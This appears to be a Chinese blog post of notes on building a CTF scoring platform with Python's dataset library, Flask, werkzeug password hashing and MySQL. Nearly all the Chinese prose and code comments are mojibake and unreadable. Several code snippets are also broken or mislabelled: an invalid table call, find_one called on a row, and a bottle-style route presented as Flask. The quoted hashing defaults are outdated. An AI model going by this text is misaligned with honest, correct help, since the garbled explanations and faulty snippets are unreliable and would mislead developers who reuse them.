<p>ä¸€å®šè¦æ³¨æ„æŒ‡å®šå­—ç¬¦ç¼–ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">table = db[&apos;city&apos;]  #ï¼ˆé€‰æ‹©cityè¡¨ï¼‰</div><div class="line">user = table(&apos;name&apos;) # æ‰¾å‡ºè¡¨ä¸­&apos;name&apos;åˆ—å±æ€§æ‰€æœ‰æ•°æ®</div><div class="line">res = db.query(&apos;select name from table limit 10&apos;) # å¦‚æœä¸éœ€è¦æŸ¥çœ‹å…¨éƒ¨æ•°æ®çš„è¯æœ€å¥½ç”¨limitï¼Œå› ä¸ºå…¨éƒ¨æ•°æ®çš„è½½å…¥éå¸¸éå¸¸è€—æ—¶é—´</div><div class="line">for x in res:</div><div class="line">    print x[&apos;name&apos;] # é€‰nameå­—æ®µçš„æ•°æ®</div><div class="line">table.insert(dict(name=&apos;John Doe&apos;, age=37))</div><div class="line">table.insert(dict(name=&apos;Jane Doe&apos;, age=34, gender=&apos;female&apos;))</div><div class="line">john = table.find_one(name=&apos;John Doe&apos;)</div></pre></td></tr></table></figure>
<p>åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰åŒæ—¶æ»¡è¶³å¤šä¸ªæ¡ä»¶çš„æ•°æ®ï¼š<code>table.find_one(å±æ€§1=å±æ€§å€¼1, å±æ€§2=å±æ€§å€¼2, ...)</code></p>
<p>æ³¨ï¼š<code>find_one</code>é€Ÿåº¦å¾ˆæ…¢</p>
<h2 id="æ’å…¥æ•°æ®"><a href="#æ’å…¥æ•°æ®" class="headerlink" title="æ’å…¥æ•°æ®"></a>æ’å…¥æ•°æ®</h2><p>datasetä¼šæ ¹æ®è¾“å…¥è‡ªåŠ¨åˆ›å»ºè¡¨å’Œå­—æ®µå</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">table = db[&apos;user&apos;]</div><div class="line"># æˆ–è€…table = db.get_table(&apos;user&apos;)</div><div class="line">table.insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line">table.insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;))</div><div class="line"># ä¸»é”®idè‡ªåŠ¨ç”Ÿæˆ</div></pre></td></tr></table></figure>
<h2 id="æ›´æ–°æ•°æ®"><a href="#æ›´æ–°æ•°æ®" class="headerlink" title="æ›´æ–°æ•°æ®"></a>æ›´æ–°æ•°æ®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">table.update(dict(name=&apos;John Doe&apos;, age=47), [&apos;name&apos;])</div><div class="line"># ç¬¬äºŒä¸ªå‚æ•°ç›¸å½“äºsql updateè¯­å¥ä¸­çš„whereï¼Œç”¨æ¥è¿‡æ»¤å‡ºéœ€è¦æ›´æ–°çš„è®°å½•</div></pre></td></tr></table></figure>
<h2 id="äº‹åŠ¡æ“ä½œ"><a href="#äº‹åŠ¡æ“ä½œ" class="headerlink" title="äº‹åŠ¡æ“ä½œ"></a>äº‹åŠ¡æ“ä½œ</h2><p>äº‹åŠ¡æ“ä½œå¯ä»¥ç®€å•çš„ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ¥å®ç°,å‡ºç°å¼‚å¸¸ï¼Œå°†ä¼šå›æ»š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">with dataset.connect() as tx:</div><div class="line">    tx[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line"># ç›¸å½“äºï¼š</div><div class="line">db = dataset.connect()</div><div class="line">db.begin()</div><div class="line">try:</div><div class="line">    db[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line">    db.commit()</div><div class="line">except:</div><div class="line">    db.rollback()</div><div class="line"># ä¹Ÿå¯ä»¥åµŒå¥—ä½¿ç”¨:</div><div class="line">db = dataset.connect()</div><div class="line">with db as tx1:</div><div class="line">    tx1[&apos;user&apos;].insert(dict(name=&apos;John Doe&apos;, age=46, country=&apos;China&apos;))</div><div class="line">    with db as tx2:</div><div class="line">        tx2[&apos;user&apos;].insert(dict(name=&apos;Jane Doe&apos;, age=37, country=&apos;France&apos;, gender=&apos;female&apos;))</div></pre></td></tr></table></figure>
<h2 id="ä»è¡¨è·å–æ•°æ®"><a href="#ä»è¡¨è·å–æ•°æ®" class="headerlink" title="ä»è¡¨è·å–æ•°æ®"></a>ä»è¡¨è·å–æ•°æ®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">users = db[&apos;user&apos;].all()</div><div class="line">for user in db[&apos;user&apos;]:</div><div class="line">    # print(user[&apos;age&apos;])</div><div class="line">    # chinese_users = user.find(country=&apos;China&apos;)</div><div class="line">    john = user.find_one(name=&apos;John Doe&apos;)</div></pre></td></tr></table></figure>
<p>è·å–éé‡å¤æ•°æ®</p>
<p><code>db[&#39;user&#39;].distinct(&#39;country&#39;)</code></p>
<h2 id="åˆ é™¤è®°å½•"><a href="#åˆ é™¤è®°å½•" class="headerlink" title="åˆ é™¤è®°å½•"></a>åˆ é™¤è®°å½•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">table.delete(place=&apos;Berlin&apos;)</div></pre></td></tr></table></figure>
<h2 id="æ‰§è¡ŒSQLè¯­å¥"><a href="#æ‰§è¡ŒSQLè¯­å¥" class="headerlink" title="æ‰§è¡ŒSQLè¯­å¥"></a>æ‰§è¡ŒSQLè¯­å¥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">result = db.query(&apos;SELECT country, COUNT(*) c FROM user GROUP BY country&apos;)</div><div class="line">for row in result:</div><div class="line">    print(row[&apos;country&apos;], row[&apos;c&apos;])</div></pre></td></tr></table></figure>
<h2 id="å¯¼å‡ºæ•°æ®"><a href="#å¯¼å‡ºæ•°æ®" class="headerlink" title="å¯¼å‡ºæ•°æ®"></a>å¯¼å‡ºæ•°æ®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">result = db[&apos;users&apos;].all()</div><div class="line">dataset.freeze(result, format=&apos;json&apos;, filename=&apos;users.json&apos;)</div></pre></td></tr></table></figure>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON(JavaScript Object Notation) æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œéå¸¸æ˜“äºäººé˜…è¯»å’Œç¼–å†™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import json</div><div class="line">json.dumps å°† Python å¯¹è±¡ç¼–ç æˆ JSON å­—ç¬¦ä¸²</div><div class="line">json.loads å°†å·²ç¼–ç çš„ JSON å­—ç¬¦ä¸²è§£ç ä¸º Python å¯¹è±¡</div></pre></td></tr></table></figure>
<h1 id="MySQLæ•°æ®åº“ï¼š"><a href="#MySQLæ•°æ®åº“ï¼š" class="headerlink" title="MySQLæ•°æ®åº“ï¼š"></a>MySQLæ•°æ®åº“ï¼š</h1><p>åˆ†ç±»è¡¨-categoriesï¼ŒåŒ…æ‹¬ç±»åˆ«web,reversingï¼Œcrypto(åŠ è§£å¯†),micç­‰</p>
<p>é¢˜ç›®è¡¨-tasks,åŒ…æ‹¬é¢˜ç›®idï¼Œé¢˜ç›®åï¼Œflag,åˆ†å€¼ï¼Œæ–‡ä»¶&amp;åœ°å€ï¼Œé¢˜ç›®ç­‰çº§ï¼Œé¢˜ç›®è¯¦ç»†æè¿°</p>
<p>flagè¡¨-flag,åŒ…æ‹¬é¢˜ç›®id,ç”¨æˆ·id,å¾—åˆ†ï¼Œæ—¶é—´æˆ³</p>
<p>ç”¨æˆ·è¡¨-usersï¼ŒåŒ…æ‹¬ç”¨æˆ·id,ç”¨æˆ·åï¼Œå¯†ç </p>
<p>é¢˜ç›®åˆ†ç±»è¡¨-<code>cat_task</code>,åŒ…æ‹¬é¢˜ç›®id,é¢˜ç›®ç±»åˆ«id</p>
<p>flagè¡¨ä¸­æ¯æ¡æ•°æ®ç”±äºæ˜¯æœ‰é¢˜ç›®ID <code>task_id</code>å’Œç”¨æˆ·ID <code>user_id</code>æ¥å…±åŒç¡®è®¤çš„ï¼Œæ‰€ä»¥é‡‡ç”¨å¤åˆä¸»é”®ï¼š<code>primary key (task_id,user_id)</code></p>
<p><a href="http://blog.csdn.net/u011781521/article/details/71083112" target="_blank" rel="external">è”åˆä¸»é”®å’Œå¤åˆä¸»é”®çš„åŒºåˆ«</a></p>
<h1 id="pythonè£…é¥°å™¨"><a href="#pythonè£…é¥°å™¨" class="headerlink" title="pythonè£…é¥°å™¨"></a>pythonè£…é¥°å™¨</h1><p>Decoratoré€šè¿‡è¿”å›åŒ…è£…å¯¹è±¡å®ç°é—´æ¥è°ƒç”¨,ä»¥æ­¤æ’å…¥é¢å¤–é€»è¾‘</p>
<p><a href="https://www.zhihu.com/question/26930016" target="_blank" rel="external">https://www.zhihu.com/question/26930016</a></p>
<p>wrapsæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒèƒ½æŠŠåŸå‡½æ•°çš„å…ƒä¿¡æ¯æ‹·è´åˆ°è£…é¥°å™¨å‡½æ•°ä¸­ï¼Œè¿™ä½¿å¾—è£…é¥°å™¨å‡½æ•°ä¹Ÿæœ‰å’ŒåŸå‡½æ•°ä¸€æ ·çš„å…ƒä¿¡æ¯äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from functools import wraps</div><div class="line">def logged(func):</div><div class="line">    @wraps(func)</div><div class="line">    def with_logging(*args,**kwargs):</div><div class="line">        print func.__name__ + &quot;was called&quot;</div><div class="line">        return func(*args,**kwargs)</div><div class="line">    return with_logging</div><div class="line"></div><div class="line">@logged</div><div class="line">def f(x):</div><div class="line">    &quot;&quot;&quot;does some math&quot;&quot;&quot;</div><div class="line">    return x + x * x</div><div class="line"></div><div class="line">print f.__name__ # prints &apos;f&apos;</div><div class="line">print f.__doc__  # prints &apos;does some math&apos;</div></pre></td></tr></table></figure>
<h1 id="webæ¡†æ¶é‡‡ç”¨flask"><a href="#webæ¡†æ¶é‡‡ç”¨flask" class="headerlink" title="webæ¡†æ¶é‡‡ç”¨flask"></a>webæ¡†æ¶é‡‡ç”¨flask</h1><p><code>from flask import Flask</code></p>
<p>å¼•å…¥Flaskç±»ï¼ŒFlaskç±»å®ç°äº†ä¸€ä¸ª<code>WSGI(Web Server Gateway Interface)</code>åº”ç”¨</p>
<p><code>app = Flask(__name__)</code></p>
<p>appæ˜¯Flaskçš„å®ä¾‹ï¼Œå®ƒæ¥æ”¶åŒ…æˆ–è€…æ¨¡å—çš„åå­—ä½œä¸ºå‚æ•°ï¼Œä½†ä¸€èˆ¬éƒ½æ˜¯ä¼ é€’<code>__name__</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def hello_world():</div><div class="line">    return &apos;Hello World!&apos;</div></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>app.route</code>è£…é¥°å™¨ä¼šå°†URLå’Œæ‰§è¡Œçš„è§†å›¾å‡½æ•°çš„å…³ç³»ä¿å­˜åˆ°<code>app.url_map</code>å±æ€§ä¸Šã€‚å¤„ç†URLå’Œè§†å›¾å‡½æ•°çš„å…³ç³»çš„ç¨‹åºå°±æ˜¯è·¯ç”±ï¼Œè¿™é‡Œçš„è§†å›¾å‡½æ•°å°±æ˜¯<code>hello_world</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run(host=&apos;0.0.0.0&apos;,port=9000)</div></pre></td></tr></table></figure>
<p>ä½¿ç”¨è¿™ä¸ªåˆ¤æ–­å¯ä»¥ä¿è¯å½“å…¶ä»–æ–‡ä»¶å¼•ç”¨è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼ˆä¾‹å¦‚<code>from hello import app</code>ï¼‰ä¸ä¼šæ‰§è¡Œè¿™ä¸ªåˆ¤æ–­å†…çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šæ‰§è¡Œ<code>app.run</code>å‡½æ•°ã€‚</p>
<p>æ‰§è¡Œ<code>app.run</code>å°±å¯ä»¥å¯åŠ¨æœåŠ¡äº†ã€‚é»˜è®¤Flaskåªç›‘å¬è™šæ‹Ÿæœºçš„æœ¬åœ°<code>127.0.0.1</code>è¿™ä¸ªåœ°å€ï¼Œç«¯å£ä¸º<code>5000</code>ã€‚è€Œæˆ‘ä»¬å¯¹è™šæ‹Ÿæœºåšçš„ç«¯å£è½¬å‘ç«¯å£æ˜¯<code>9000</code>ï¼Œæ‰€ä»¥éœ€è¦åˆ¶å®šhostå’Œportå‚æ•°ï¼Œ<code>0.0.0.0</code>è¡¨ç¤ºç›‘å¬æ‰€æœ‰åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœ¬æœºè®¿é—®äº†ã€‚</p>
<p>æœåŠ¡å™¨å¯åŠ¨åï¼Œä¼šè°ƒç”¨<code>werkzeug.serving.run_simple</code>è¿›å…¥è½®è¯¢ï¼Œé»˜è®¤ä½¿ç”¨å•è¿›ç¨‹å•çº¿ç¨‹çš„<code>werkzeug.serving.BaseWSGIServer</code>å¤„ç†è¯·æ±‚ï¼Œå®é™…ä¸Šè¿˜æ˜¯ä½¿ç”¨æ ‡å‡†åº“<code>BaseHTTPServer.HTTPServer</code>ï¼Œé€šè¿‡<code>select.select</code>åš0.5ç§’çš„<code>while TRUE</code>çš„äº‹ä»¶è½®è¯¢ã€‚å½“æˆ‘ä»¬è®¿é—®<code>http://127.0.0.1:9000/</code>,é€šè¿‡<code>app.url_map</code>æ‰¾åˆ°æ³¨å†Œçš„<code>/</code>è¿™ä¸ªURLæ¨¡å¼,å°±æ‰¾åˆ°äº†å¯¹åº”çš„<code>hello_world</code>å‡½æ•°æ‰§è¡Œï¼Œè¿”å›<code>hello world!</code>,çŠ¶æ€ç ä¸º200ã€‚å¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ï¼Œå¦‚è®¿é—®<code>http://127.0.0.1:9000/a</code>,Flaskæ‰¾ä¸åˆ°å¯¹åº”çš„æ¨¡å¼ï¼Œå°±ä¼šå‘æµè§ˆå™¨è¿”å›<code>Not Found</code>ï¼ŒçŠ¶æ€ç ä¸º404</p>
<h1 id="flaskä¸­jsonifyçš„ä½œç”¨"><a href="#flaskä¸­jsonifyçš„ä½œç”¨" class="headerlink" title="flaskä¸­jsonifyçš„ä½œç”¨"></a>flaskä¸­jsonifyçš„ä½œç”¨</h1><p>jsonifyçš„ä½œç”¨å®é™…ä¸Šå°±æ˜¯å°†æˆ‘ä»¬ä¼ å…¥çš„jsonå½¢å¼æ•°æ®åºåˆ—åŒ–æˆä¸ºjsonå­—ç¬¦ä¸²ï¼Œä½œä¸ºå“åº”çš„bodyï¼Œå¹¶ä¸”è®¾ç½®å“åº”çš„<code>Content-Type</code>ä¸º<code>application/json</code>ï¼Œæ„é€ å‡ºå“åº”è¿”å›è‡³å®¢æˆ·ç«¯</p>
<p>æ•ˆæœç­‰äº<code>json.dumps</code></p>
<p><code>jsonify</code>çš„<code>Content-Type</code>å­—æ®µå€¼ä¸º<code>application/json</code></p>
<p><code>json.dumps</code>çš„<code>Content-Type</code>å­—æ®µå€¼ä¸º<code>text/html</code></p>
<h1 id="ä¿®æ”¹flaskä¸­é™æ€æ–‡ä»¶å¤¹"><a href="#ä¿®æ”¹flaskä¸­é™æ€æ–‡ä»¶å¤¹" class="headerlink" title="ä¿®æ”¹flaskä¸­é™æ€æ–‡ä»¶å¤¹"></a>ä¿®æ”¹flaskä¸­é™æ€æ–‡ä»¶å¤¹</h1><p>ä¿®æ”¹çš„flaské»˜è®¤çš„staticæ–‡ä»¶å¤¹åªéœ€è¦åœ¨åˆ›å»ºFlaskå®ä¾‹çš„æ—¶å€™,æŠŠ<code>static_folder</code>å’Œ<code>static_url_path</code>å‚æ•°è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²å³å¯ã€‚</p>
<p><code>app = Flask(__name__, static_folder=&#39;&#39;, static_url_path=&#39;&#39;)</code></p>
<p>è®¿é—®çš„æ—¶å€™ç”¨<code>url_for</code>å‡½æ•°ï¼Œresæ–‡ä»¶å¤¹å’Œstaticæ–‡ä»¶å¤¹åŒä¸€çº§ï¼š</p>
<p><code>url_for(&#39;static&#39;, filename=&#39;res/favicon.ico&#39;)</code></p>
<h1 id="werkzeug"><a href="#werkzeug" class="headerlink" title="werkzeug"></a>werkzeug</h1><p>werkzeugæ˜¯ä¸€ä¸ªWSGIå·¥å…·åŒ…ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªWebæ¡†æ¶çš„åº•å±‚åº“ã€‚å®ƒå°è£…å¥½äº†å¾ˆå¤šWebæ¡†æ¶çš„ä¸œè¥¿ï¼Œä¾‹å¦‚ Requestï¼ŒResponseç­‰ç­‰ã€‚Flaskæ¡†æ¶å°±æ˜¯ä¸€Werkzeug ä¸ºåŸºç¡€å¼€å‘çš„</p>
<h2 id="generate-password-hash-password"><a href="#generate-password-hash-password" class="headerlink" title="generate_password_hash(password)"></a>generate_password_hash(password)</h2><p>å°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç åŠ å¯†æˆå¯†æ–‡è¿›è¡Œå­˜å‚¨</p>
<p>å¯†ç åŠ ç›å“ˆå¸Œå‡½æ•°ã€‚ç”¨æ¥å°†æ˜æ–‡å¯†ç åŠ å¯†ï¼Œè¿”å›åŠ å¯†åçš„å¯†æ–‡ï¼Œç”¨æ¥è¿›è¡Œç”¨æˆ·æ³¨å†Œ</p>
<p>å‡½æ•°å®šä¹‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">werkzeug.security.generate_password_hash(password, method=&apos;pbkdf2:sha1&apos;, salt_length=8)</div><div class="line">å¯†æ–‡æ ¼å¼ï¼šmethod$salt$hash</div><div class="line">password: æ˜æ–‡å¯†ç </div><div class="line">method: å“ˆå¸Œçš„æ–¹å¼ï¼ˆéœ€è¦æ˜¯hashlibåº“æ”¯æŒçš„ï¼‰ï¼Œæ ¼å¼ä¸º</div><div class="line">pbpdf2:&lt;method&gt;[:iterations]ã€‚å‚æ•°è¯´æ˜ï¼š</div><div class="line">    methodï¼šå“ˆå¸Œçš„æ–¹å¼ï¼Œä¸€èˆ¬ä¸ºSHA1ï¼Œ</div><div class="line">    iterationsï¼šï¼ˆå¯é€‰å‚æ•°ï¼‰è¿­ä»£æ¬¡æ•°ï¼Œé»˜è®¤ä¸º1000ã€‚</div><div class="line">slat_length: ç›å€¼çš„é•¿åº¦ï¼Œé»˜è®¤ä¸º8</div></pre></td></tr></table></figure>
<h2 id="check-password-hash-hash-password"><a href="#check-password-hash-hash-password" class="headerlink" title="check_password_hash(hash,password)"></a>check_password_hash(hash,password)</h2><p>éªŒè¯ç»è¿‡<code>generate_password_hash</code>å“ˆå¸Œçš„å¯†ç ï¼Œå°†æ˜æ–‡å’Œå¯†æ–‡è¿›è¡Œæ¯”è¾ƒ,æŸ¥çœ‹æ˜¯å¦ä¸€è‡´ï¼Œç”¨æ¥éªŒè¯ç”¨æˆ·ç™»å½•</p>
<p>å‡½æ•°å®šä¹‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">werkzeug.security.check_password_hash(pwhash, password)</div><div class="line">pwhash: generate_password_hashç”Ÿæˆçš„å“ˆå¸Œå­—ç¬¦ä¸²</div><div class="line">password: éœ€è¦éªŒè¯çš„æ˜æ–‡å¯†ç </div></pre></td></tr></table></figure>
<h1 id="flaskä¸­çš„session"><a href="#flaskä¸­çš„session" class="headerlink" title="flaskä¸­çš„session"></a>flaskä¸­çš„session</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">from flask import session</div><div class="line">user = db[&apos;users&apos;].find_one(username=username)</div><div class="line">session[&apos;user_id&apos;] = user[&apos;id&apos;]</div></pre></td></tr></table></figure>
<p>ç”±äºä½¿ç”¨äº†sessionï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®ä¸€ä¸ª<code>secret_key</code>ç”¨æ¥åšä¸€äº›æ¨¡å—çš„hash<br>Flask Web Development ä¸­çš„å†…å®¹:</p>
<p><code>SECRET_KEY</code>é…ç½®å˜é‡æ˜¯é€šç”¨å¯†é’¥,å¯åœ¨Flaskå’Œå¤šä¸ªç¬¬ä¸‰æ–¹æ‰©å±•ä¸­ä½¿ç”¨ã€‚å¦‚å…¶åæ‰€ç¤º,åŠ å¯†çš„å¼ºåº¦å–å†³äºå˜é‡å€¼çš„æœºå¯†åº¦ã€‚ä¸åŒçš„ç¨‹åºè¦ä½¿ç”¨ä¸åŒçš„å¯†é’¥,è€Œä¸”è¦ä¿è¯å…¶ä»–äººä¸çŸ¥é“ä½ æ‰€ç”¨çš„å­—ç¬¦ä¸²ã€‚</p>
<p><code>SECRET_KEY</code>çš„ä½œç”¨ä¸»è¦æ˜¯æä¾›ä¸€ä¸ªå€¼åšå„ç§HASH, æ˜¯åœ¨å…¶åŠ å¯†è¿‡ç¨‹ä¸­ä½œä¸ºç®—æ³•çš„ä¸€ä¸ªå‚æ•°(saltæˆ–å…¶ä»–)ã€‚æ‰€ä»¥è¿™ä¸ªå€¼çš„å¤æ‚åº¦ä¹Ÿå°±å½±å“åˆ°äº†æ•°æ®ä¼ è¾“å’Œå­˜å‚¨æ—¶çš„å¤æ‚åº¦ã€‚</p>
<h1 id="flask-å˜é‡è§„åˆ™"><a href="#flask-å˜é‡è§„åˆ™" class="headerlink" title="flask å˜é‡è§„åˆ™"></a>flask å˜é‡è§„åˆ™</h1><p>è¦ç»™URLæ·»åŠ å˜é‡éƒ¨åˆ†ï¼Œä½ å¯ä»¥æŠŠè¿™äº›ç‰¹æ®Šçš„å­—æ®µæ ‡è®°ä¸º<code>&lt;variable_name&gt;</code>ï¼Œ è¿™ä¸ªéƒ¨åˆ†å°†ä¼šä½œä¸ºå‘½åå‚æ•°ä¼ é€’åˆ°ä½ çš„å‡½æ•°ã€‚è§„åˆ™å¯ä»¥ç”¨<code>&lt;converter:variable_name&gt;</code>æŒ‡å®šä¸€ä¸ªå¯é€‰çš„è½¬æ¢å™¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@route(&apos;/hello/&lt;name&gt;&apos;)</div><div class="line">def index(name):</div><div class="line">  return &apos;&lt;b&gt;Hello &#123;&#123;name&#125;&#125;&lt;/b&gt;!&apos;</div></pre></td></tr></table></figure>
<h1 id="æ•°æ®åº“æŸ¥è¯¢"><a href="#æ•°æ®åº“æŸ¥è¯¢" class="headerlink" title="æ•°æ®åº“æŸ¥è¯¢"></a>æ•°æ®åº“æŸ¥è¯¢</h1><p>å¯¹datasetçš„æ•°æ®æŸ¥è¯¢ï¼Œä½¿ç”¨å†’å·æ¥ä¸ºå˜é‡ä¼ å‚ã€‚</p>
<p><code>select f.task_id from flags f where f.user_id = :user_id&#39;&#39;&#39;,user_id=session[&#39;user_id&#39;])</code></p>
<h1 id="æ¨¡æ¿æ¸²æŸ“"><a href="#æ¨¡æ¿æ¸²æŸ“" class="headerlink" title="æ¨¡æ¿æ¸²æŸ“"></a>æ¨¡æ¿æ¸²æŸ“</h1><p>ä½¿ç”¨<code>render_template</code>æ–¹æ³•æ¥æ¸²æŸ“æ¨¡æ¿ã€‚å°†æ¨¡æ¿åå’Œä½ æƒ³ä½œä¸ºå…³é”®å­—çš„å‚æ•°ä¼ å…¥æ¨¡æ¿çš„å˜é‡</p>
<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p><code>IFNULL(expr1,expr2)</code></p>
<p>å¦‚æœexpr1ä¸æ˜¯NULLï¼Œ<code>IFNULL()</code>è¿”å›expr1ï¼Œå¦åˆ™å®ƒè¿”å›expr2ã€‚</p>
<p><code>IFNULL()</code>è¿”å›ä¸€ä¸ªæ•°å­—æˆ–å­—ç¬¦ä¸²å€¼ï¼Œå–å†³äºå®ƒè¢«ä½¿ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚</p>
<p>maxå‡½æ•°æ˜¯ç”¨æ¥æ‰¾å‡ºè®°å½•é›†ä¸­æœ€å¤§å€¼çš„è®°å½•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. å¯¹äºleft joinï¼Œä¸ç®¡onåé¢è·Ÿä»€ä¹ˆæ¡ä»¶ï¼Œå·¦è¡¨çš„æ•°æ®å…¨éƒ¨æŸ¥å‡ºæ¥ï¼Œå› æ­¤è¦æƒ³è¿‡æ»¤éœ€æŠŠæ¡ä»¶æ”¾åˆ°whereåé¢</div><div class="line">2. å¯¹äºinner joinï¼Œæ»¡è¶³onåé¢çš„æ¡ä»¶è¡¨çš„æ•°æ®æ‰èƒ½æŸ¥å‡ºï¼Œå¯ä»¥èµ·åˆ°è¿‡æ»¤ä½œç”¨ã€‚ä¹Ÿå¯ä»¥æŠŠæ¡ä»¶æ”¾åˆ°whereåé¢</div></pre></td></tr></table></figure>
<p>åœ¨ä½¿ç”¨left jionæ—¶ï¼Œonå’Œwhereæ¡ä»¶çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1ã€ onæ¡ä»¶æ˜¯åœ¨ç”Ÿæˆä¸´æ—¶è¡¨æ—¶ä½¿ç”¨çš„æ¡ä»¶ï¼Œå®ƒä¸ç®¡onä¸­çš„æ¡ä»¶æ˜¯å¦ä¸ºçœŸï¼Œéƒ½ä¼šè¿”å›å·¦è¾¹è¡¨ä¸­çš„è®°å½•ã€‚</div><div class="line">2ã€whereæ¡ä»¶æ˜¯åœ¨ä¸´æ—¶è¡¨ç”Ÿæˆå¥½åï¼Œå†å¯¹ä¸´æ—¶è¡¨è¿›è¡Œè¿‡æ»¤çš„æ¡ä»¶ã€‚è¿™æ—¶å·²ç»æ²¡æœ‰left joinçš„å«ä¹‰ï¼ˆå¿…é¡»è¿”å›å·¦è¾¹è¡¨çš„è®°å½•ï¼‰äº†ï¼Œæ¡ä»¶ä¸ä¸ºçœŸçš„å°±å…¨éƒ¨è¿‡æ»¤æ‰ã€‚</div></pre></td></tr></table></figure>
<p>order byçš„ç”¨æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ä½¿ç”¨order byï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥ï¼Œä¾ç…§æŸ¥è¯¢ç»“æœçš„æŸä¸€åˆ—ï¼ˆæˆ–å¤šåˆ—ï¼‰å±æ€§ï¼Œè¿›è¡Œæ’åºï¼ˆå‡åºï¼šASCï¼›é™åºï¼šDESCï¼›é»˜è®¤ä¸ºå‡åºï¼‰ã€‚</div><div class="line">å½“æ’åºåˆ—å«ç©ºå€¼æ—¶ï¼š</div><div class="line">ASCï¼šæ’åºåˆ—ä¸ºç©ºå€¼çš„å…ƒç»„æœ€åæ˜¾ç¤ºã€‚</div><div class="line">DESCï¼šæ’åºåˆ—ä¸ºç©ºå€¼çš„å…ƒç»„æœ€å…ˆæ˜¾ç¤ºã€‚</div><div class="line">å¯ä»¥æŠŠnullå€¼çœ‹åšæ— ç©·å¤§</div><div class="line">select * from s order by sno desc,  sage asc</div></pre></td></tr></table></figure>
